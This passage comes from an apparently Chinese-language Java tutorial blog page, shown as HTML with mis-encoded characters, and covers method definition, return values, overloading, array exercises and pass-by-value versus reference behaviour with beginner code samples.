&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å½¢å‚å’Œå®å‚</p><ul><li>å½¢å‚ï¼šå…¨ç§°å½¢å¼å‚æ•°ï¼Œæ˜¯æŒ‡æ–¹æ³•å®šä¹‰ä¸­çš„å‚æ•°ã€‚</li><li>å®å‚ï¼šå…¨ç§°å®é™…å‚æ•°ï¼Œæ–¹æ³•è°ƒç”¨ä¸­çš„å‚æ•°ã€‚</li></ul><p>æ–¹æ³•è°ƒç”¨æ—¶å½¢å‚å®å‚ä¸€ä¸€å¯¹åº”ã€‚</p><p>å¸¦è¿”å›å€¼æ–¹æ³•çš„å®šä¹‰å’Œè°ƒç”¨</p><ul><li>æ–¹æ³•çš„è¿”å›å€¼å…¶å®å°±æ˜¯æ–¹æ³•è¿è¡Œçš„æœ€ç»ˆç»“æœ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> è¿”å›å€¼ç±»å‹ æ–¹æ³•å (å‚æ•°)&#123;<br>æ–¹æ³•ä½“<br><span class="hljs-keyword">return</span> è¿”å›å€¼ï¼›<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span> <span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;<br><span class="hljs-keyword">return</span> cï¼›<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å¸¦è¿”å›å€¼æ–¹æ³•çš„è°ƒç”¨</li></ul><p>1.ç›´æ¥è°ƒç”¨</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">æ–¹æ³•å(å®å‚)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>2.èµ‹å€¼è°ƒç”¨</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">æ•°æ®ç±»å‹ å˜é‡å <span class="hljs-operator">=</span> æ–¹æ³•å(å®å‚)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>3.è¾“å‡ºè°ƒç”¨</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">sout(æ–¹æ³•å (å®å‚))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1.æˆ‘è¦å¹²å˜›ï¼Ÿ<br>2.éœ€è¦ä»€ä¹ˆï¼Ÿ<br>3.æ–¹æ³•çš„è°ƒç”¨å‡ºï¼Œæ˜¯å¦éœ€è¦ç»§ç»­ä½¿ç”¨æ–¹æ³•çš„ç»“æœã€‚<br>å¦‚æœéœ€è¦ï¼Œåˆ™å¿…é¡»æœ‰è¿”å›å€¼<br>å¦‚æœä¸éœ€è¦ï¼Œå†™ä¸å†™è¿”å›å€¼éƒ½è¡Œ<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ¯”è¾ƒå¤§å°</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mianji1</span> <span class="hljs-operator">=</span> plusWhat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">mianji2</span> <span class="hljs-operator">=</span> plusWhat(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br>        compare(mianji1,mianji2);<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">plusWhat</span><span class="hljs-params">(<span class="hljs-type">int</span> length, <span class="hljs-type">int</span> width)</span> &#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mianji</span> <span class="hljs-operator">=</span> length * width;<br><br>        <span class="hljs-keyword">return</span> mianji;<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-type">int</span> input1, <span class="hljs-type">int</span> input2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> ( input1 &gt; input2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªæ›´å¤§&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;ç¬¬äºŒä¸ªæ›´å¤§&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„äº‹é¡¹ï¼š</p><ul><li>æ–¹æ³•ä¸è°ƒç”¨å°±ä¸æ‰§è¡Œ</li><li>æ–¹æ³•ä¸æ–¹æ³•ä¹‹é—´æ˜¯å¹³çº§å…³ç³»ï¼Œä¸èƒ½äº’ç›¸åµŒå¥—å®šä¹‰ã€‚</li><li>æ–¹æ³•çš„ç¼–å†™é¡ºåºå’Œæ‰§è¡Œé¡ºåºæ— å…³ã€‚</li><li>æ–¹æ³•çš„è¿”å›å€¼ç±»å‹ä¸ºvoidï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ï¼Œæ²¡æœ‰è¿”å›å€¼çš„æ–¹æ³•å¯ä»¥çœç•¥returnä¸å†™ã€‚å¦‚æœéè¦å†™returnï¼Œåé¢ä¸èƒ½è·Ÿå…·ä½“çš„æ•°æ®ã€‚</li><li>returnè¯­å¥ä¸‹é¢ä¸èƒ½ç¼–å†™ä»£ç ï¼Œå› ä¸ºæ°¸è¿œæ‰§è¡Œä¸åˆ°ã€‚</li></ul><p>æ–¹æ³•çš„é‡è½½</p><ul><li>åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œå®šä¹‰äº†å¤šä¸ªåŒåçš„æ–¹æ³•ï¼Œè¿™äº›åŒåçš„æ–¹æ³•å…·æœ‰ç›¸åŒçš„åŠŸèƒ½ã€‚</li><li>æ¯ä¸ªæ–¹æ³•å…·æœ‰ä¸åŒçš„å‚æ•°ç±»å‹æˆ–å‚æ•°ä¸ªæ•°ï¼Œè¿™äº›åŒåçš„æ–¹æ³•å°±æ„æˆäº†é‡è½½å…³ç³»ã€‚</li></ul><p>Javaè™šæ‹Ÿæœºä¼šé€šè¿‡ä¸åŒçš„å‚æ•°æ¥åŒºåˆ†åŒåçš„æ–¹æ³•ï¼Œæ‰€ä»¥é‡è½½çš„å…³é”®æ˜¯è¦æŠŠåŒç§æ–¹æ³•ä¸åŒçš„å½¢å‚åŒºåˆ†å¼€ã€‚</p><p><img src="/img/javalearn38.png" alt="javalearn38"></p><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (num1 == num2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;ä¸¤æ•°ç›¸ç­‰&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;ä¸ç›¸åŒ&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">double</span> num1, <span class="hljs-type">double</span> num2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (num1 == num2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;ä¸¤æ•°ç›¸ç­‰&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;ä¸ç›¸åŒ&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">short</span> num1, <span class="hljs-type">short</span> num2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (num1 == num2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;ä¸¤æ•°ç›¸ç­‰&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;ä¸ç›¸åŒ&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šéå†ä¸€ä¸ªæ•°ç»„çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        equalWhat(arr);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br><br>        System.out.print(<span class="hljs-string">&quot;[&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-comment">//System.out.println(&quot;[&quot;);</span><br>            <span class="hljs-keyword">if</span> (i == arr.length - <span class="hljs-number">1</span>)&#123;<br>                System.out.print(arr[i]);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.print(arr[i] + <span class="hljs-string">&quot;, &quot;</span>);<br>            &#125;<br>        &#125;<br>        System.out.print(<span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šè®¾è®¡ä¸€ä¸ªæ–¹æ³•æ±‚æ•°ç»„çš„æœ€å¤§å€¼ï¼Œå¹¶å°†æœ€å¤§å€¼è¿”å›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        equalWhat(arr);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-keyword">if</span> (arr[i] &gt; max)&#123;<br>                max = arr[i];<br>            &#125;<br>        &#125;<br>        System.out.print(<span class="hljs-string">&quot;è¯¥æ•°ç»„çš„æœ€å¤§å€¼æ˜¯ï¼š&quot;</span> + max);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šå®šä¹‰ä¸€ä¸ªæ–¹æ³•åˆ¤æ–­æ•°ç»„ä¸­çš„æŸä¸€ä¸ªæ•°æ˜¯å¦å­˜åœ¨ï¼Œå°†ç»“æœè¿”å›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><br>         <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> equalWhat(arr, target);<br><br>        System.out.println(flag);<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> target)</span> &#123;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-keyword">if</span> (arr[i] == target)&#123;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šå¤åˆ¶æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">from1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">to1</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><br>         <span class="hljs-type">int</span>[] flag = copyWhat(arr, from1, to1);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; flag.length; i++) &#123;<br><br>            System.out.println(flag[i]);<br><br>        &#125;<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] copyWhat(<span class="hljs-type">int</span>[] arr1, <span class="hljs-type">int</span> from, <span class="hljs-type">int</span> to) &#123;<br><br>        <span class="hljs-type">int</span>[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[to - from];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> from, j = <span class="hljs-number">0</span>; i &lt; to &amp;&amp; j &lt; arr2.length; i++ , j++) &#123;<br><br>             arr2[j] = arr1[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr2;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ–¹æ³•çš„å†…å­˜</p><ul><li>åŸºæœ¬æ•°æ®ç±»å‹ï¼š</li></ul><p>æ•´æ•°ç±»å‹ï¼Œæµ®ç‚¹æ•°ç±»å‹ï¼Œå¸ƒå°”ç±»å‹ï¼Œå­—ç¬¦ç±»å‹(æ•°æ®å€¼å­˜å‚¨åœ¨è‡ªå·±çš„ç©ºé—´ä¸­)</p><ul><li>å¼•ç”¨æ•°æ®ç±»å‹</li></ul><p>é™¤äº†åŸºæœ¬æ•°æ®ç±»å‹çš„å…¶å®ƒæ‰€æœ‰ç±»å‹(å˜é‡ä¸­å­˜å‚¨çš„æ˜¯åœ°å€å€¼)ã€‚</p><p><img src="/img/javalearn40.png" alt="javalearn40"></p><p>æ–¹æ³•ä¼ é€’åŸºæœ¬æ•°æ®ç±»å‹çš„å†…å­˜åŸç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨changeæ–¹æ³•å‰å€¼ä¸ºï¼š&quot;</span> + num1);<br><br>        change(num1);<br><br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨changeæ–¹æ³•åå€¼ä¸ºï¼š&quot;</span> + num1);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> numwhat)</span> &#123;<br><br>         numwhat = <span class="hljs-number">200</span>;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-number">100</span><br><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>åŸå› å‚è€ƒï¼š</p><p><img src="/img/javalearn41.png" alt="javalearn41"></p><p>å½“ç„¶ï¼Œå¦‚æœæƒ³é€šè¿‡è°ƒç”¨<code>change</code>æ–¹æ³•å°†<code>num</code>çš„å€¼æ”¹å˜ï¼Œå¯ä»¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨changeæ–¹æ³•å‰å€¼ä¸ºï¼š&quot;</span> + num1);<br><br>         num1 = change(num1);<br><br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨changeæ–¹æ³•åå€¼ä¸ºï¼š&quot;</span> + num1);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> numwhat)</span> &#123;<br><br>         numwhat = <span class="hljs-number">200</span>;<br><br>        <span class="hljs-keyword">return</span> numwhat;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>å¦‚æœå¯¹äºå¼•ç”¨æ•°æ®ç±»å‹ï¼šä¼ é€’å¼•ç”¨æ•°æ®ç±»å‹æ—¶ã€‚ä¼ é€’çš„æ˜¯åœ°å€å€¼ï¼Œå½¢å‚çš„æ”¹å˜ä¼šå½±å“å®é™…å‚æ•°çš„å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;;<br><br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨changeæ–¹æ³•å‰å€¼ä¸ºï¼š&quot;</span> + arr1[<span class="hljs-number">1</span>]);<br><br>        change(arr1);<br><br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨changeæ–¹æ³•åå€¼ä¸ºï¼š&quot;</span> + arr1[<span class="hljs-number">1</span>]);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span>[] numwhat)</span> &#123;<br><br>         numwhat[<span class="hljs-number">1</span>] = <span class="hljs-number">200</span>;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-number">20</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h4 id="ç»¼åˆç»ƒä¹ éƒ¨åˆ†"><a href="#ç»¼åˆç»ƒä¹ éƒ¨åˆ†" class="headerlink" title="ç»¼åˆç»ƒä¹ éƒ¨åˆ†"></a>ç»¼åˆç»ƒä¹ éƒ¨åˆ†</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 